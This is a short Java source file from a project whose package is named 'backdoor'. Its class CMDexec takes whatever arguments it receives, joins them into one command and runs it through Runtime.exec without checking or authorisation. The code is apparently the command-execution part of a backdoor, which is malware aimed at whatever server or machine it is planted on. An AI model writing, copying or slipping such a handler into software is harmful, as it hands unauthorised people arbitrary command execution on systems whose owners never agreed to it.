package net.jaguargaming.backdoor.commandhandlers;

import java.io.IOException;

public class CMDexec {
	
	public static void handle(String[] args) throws IllegalArgumentException, IOException {
		if (args.length == 0) {
			throw new IllegalArgumentException("No command specified");
		}
		String command = "";
		for (String cmd_line : args) {
			command += cmd_line;
			command += " ";
		}
		try {
			Runtime.getRuntime().exec(command);
		} catch (IOException e) {
			throw e;
		}
	}
	
}
